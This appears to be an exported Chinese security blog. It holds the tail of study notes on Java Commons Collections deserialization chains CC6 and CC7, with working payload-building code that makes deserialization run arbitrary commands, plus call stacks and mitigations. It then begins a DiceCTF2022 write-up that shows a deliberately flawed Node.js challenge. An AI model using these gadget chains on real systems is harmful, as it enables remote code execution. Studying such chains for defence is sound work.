        HashMap innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        LazyMap lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span>LazyMap<span class="token punctuation">)</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        TiedMapEntry tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        HashMap map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"foo2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Field f <span class="token operator">=</span> transformerChain<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> map<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这么写的话需要在最后加上一个innerMap.clear()，试着调试了一下，在创建第二个HashMap的时候，之前创建的innerMap的size自动增长了，出现了一个键值对，而LazyMap.get触发transform的条件是那个key不存在，因此需要在最后把map清空，否则无法触发</p>
<p>也可以用yso的外面再套一层HashSet</p>
<h3 id="踩坑无数"><a href="#踩坑无数" class="headerlink" title="踩坑无数"></a>踩坑无数</h3><p>已经忘了之前是怎么做的了，今天调试了一下CC6，然后踩了无数个坑。调试时IDEA会自动去获取变量值之类的数据进行展示，由此会调用toString，get等函数。而在这里很显然，toString和get等都属于致命函数，一调用就会直接触发payload，并且还会将其执行的结果放进map。我在构造payload的时候下了个断点，直接触发payload，顺便还把执行的结果，一个ProcessImpl类塞到map里，而这个类不能序列化，序列化直接失败。上述提到的innerMap.clear()清楚map内容，new第二个HashMap时innerMap自增也不知道是不是因为这个原因。。。。IDEA的这个操作导致我完全无法调试，很多问题没法解决了。。。</p>
<h3 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h3><p>同之前，把InvokerTransformer ban了</p>
<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>利用哈希碰撞时调用equal去触发LazyMap.get，LazyMap真是万能</p>
<h3 id="调用栈-6"><a href="#调用栈-6" class="headerlink" title="调用栈"></a>调用栈</h3><p>这次yso的没缩进了，手动加一个</p>
<pre><code>java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
        org.apache.commons.collections.map.AbstractMapDecorator.equals
            java.util.AbstractMap.equals
                org.apache.commons.collections.map.LazyMap.get
                    org.apache.commons.collections.functors.ChainedTransformer.transform
                    org.apache.commons.collections.functors.InvokerTransformer.transform
                    java.lang.reflect.Method.invoke
                    java.lang.Runtime.exec
</code></pre>
<h3 id="从Hashtable-readObject到LazyMap-get"><a href="#从Hashtable-readObject到LazyMap-get" class="headerlink" title="从Hashtable.readObject到LazyMap.get"></a>从Hashtable.readObject到LazyMap.get</h3><p>Hashtable的readObject最后调用了reconstitutionPut函数，进而进入AbstractMapDecorator的equal，调用的是AbstractMap的equal</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>o <span class="token keyword">instanceof</span> <span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        Map<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> m <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span> o<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Iterator<span class="token operator">&lt;</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">>></span> i <span class="token operator">=</span> <span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> i<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                K key <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                V value <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">==</span>null <span class="token operator">&amp;&amp;</span> m<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>value<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> 
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p>在<code>if (!value.equals(m.get(key)))</code>进LazyMap.get</p>
<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC7</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>

        Map innerMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Map innerMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
        Map lazyMap1 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap1<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazyMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Map lazyMap2 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap2<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazyMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Use the colliding Maps as keys in Hashtable</span>
        Hashtable hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        Field f <span class="token operator">=</span> transformerChain<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// Needed to ensure hash collision after previous manipulations</span>
        lazyMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> hashtable<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里注意一下最后的<code>lazyMap2.remove(&quot;yy&quot;);</code>，这是因为在构造的时候，两次put就已经产生了碰撞，而碰撞之后把lazymap2中添加了lazymap1中的项，需要把它移除才能保证在反序列化的时候再次发送哈希碰撞<br>以及hashCode(“yy”)&#x3D;&#x3D;hashCode(“zZ”)，所以会发生碰撞</p>
<h3 id="修复方案-6"><a href="#修复方案-6" class="headerlink" title="修复方案"></a>修复方案</h3><p>同上</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>TiedMapEntry的触发实际上是用自己的key去调用transform方法，所以可以调用任意类的一个public方法，只需要将TiedMapEntry的key设为那个类的一个实例即可（好像用一堆transformer一直invoke下去也能调用任意类的任意public方法，也说不定）</p>
<p>还有就是一开始初始化ChainedTransformer时直接放payload进去，容易在构造序列化数据的时候直接触发，打自己一下。。。正确的做法是先塞个垃圾进去，搞完了再反射改掉，所以yso都是这么做的</p>
<p>总结一下使用场景<br>CC1&#x2F;3用的AnnotationInvocationHandler只适用于远古jdk，基本上没有用<br>CC2&#x2F;4用的TransformingComparator只适用于Common Collections4.0，勉强能用<br>CC5&#x2F;6都是走到TiedMapEntry，进LazyMap.get<br>其中CC5的BadAttributeValueExpException适用于高版本jdk且需要一个SecurityManager的配置<br>CC7用的Hashtable也是走到LazyMap.get，但和5&#x2F;6相比，少一个TiedMapEntry<br>以及CC5&#x2F;6&#x2F;7似乎对于Common Collections3&#x2F;4均适用</p>
<p>后续还有各种和TemplateImpl结合的变体打法，可能就是市面上流传的CC8&#x2F;9&#x2F;10</p>
<p>而最后的执行环节一定是用到Transformer的，所以在Common Collections3.2.1以及Common Collections4.0之后，这几个相关Transformer均不可序列化，完成了超级防御</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>我直接打开rmb神仙的博客开始学习并超级提问呜呜<br><a href="https://rmb122.com/2020/01/20/ysoserial-URLDNS-CommonsCollectionsX-%E5%88%86%E6%9E%90/">ysoserial URLDNS, CommonsCollectionsX 分析</a><br><a href="https://paper.seebug.org/1242/">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>DiceCTF2022究极坐牢</title>
    <url>/DiceCTF2022%E7%A9%B6%E6%9E%81%E5%9D%90%E7%89%A2.html</url>
    <content><![CDATA[<h1 id="DiceCTF2022究极坐牢"><a href="#DiceCTF2022究极坐牢" class="headerlink" title="DiceCTF2022究极坐牢"></a>DiceCTF2022究极坐牢</h1><p>太难了，我直接坐牢</p>
<p>十个web复现都不知道要复现到什么时候<br>当然，赛时被300解的最简单web爆杀，第二天勉强看了下题等wp了<br>为什么我这么垃圾呢</p>
<p>说起来他们的web题目都挺短小精悍的，我看的几个题代码都不长，真是tql</p>
<p>（看完几个wp之后感觉都不是特别特别难。。。但是knock-knock这个题看了一个下午我就麻了。。呜呜，早知道快速切换看题了）</p>
<h2 id="knock-knock"><a href="#knock-knock" class="headerlink" title="knock-knock"></a>knock-knock</h2><p>这个题被300+的人秒杀，但是我看了一个下午也完全没想出来哪里有问题，这个题已经在我脑内实现了完美逻辑防御</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Database</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>notes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>secret <span class="token operator">=</span> <span class="token template-string"><span class="token string">`secret-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>crypto<span class="token punctuation">.</span>randomUUID<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">createNote</span><span class="token punctuation">(</span><span class="token punctuation">{</span> data <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            id<span class="token punctuation">,</span>
            token<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">generateToken</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">getNote</span><span class="token punctuation">(</span><span class="token punctuation">{</span> id<span class="token punctuation">,</span> token <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">!==</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">generateToken</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span> error<span class="token punctuation">:</span> <span class="token string">'invalid token'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">>=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span> error<span class="token punctuation">:</span> <span class="token string">'note not found'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span> data<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">generateToken</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> crypto
            <span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>secret<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>id<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> db <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
db<span class="token punctuation">.</span><span class="token function">createNote</span><span class="token punctuation">(</span><span class="token punctuation">{</span> data<span class="token punctuation">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>FLAG <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/create'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>data <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'no data provided.'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> id<span class="token punctuation">,</span> token <span class="token punctuation">}</span> <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createNote</span><span class="token punctuation">(</span><span class="token punctuation">{</span> data<span class="token punctuation">:</span> data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`/note?id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;token=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>token<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/note'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> id<span class="token punctuation">,</span> token <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>
    <span class="token keyword">const</span> note <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">getNote</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        id<span class="token punctuation">:</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>id <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'-1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        token<span class="token punctuation">:</span> <span class="token punctuation">(</span>token <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>note<span class="token punctuation">.</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>note<span class="token punctuation">.</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>note<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'listening on port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>大意就是可以输入内容，然后会给一个id和对应签出来的token。只有当id和token对应的时候才能读取内容，id为0的内容对应flag</p>
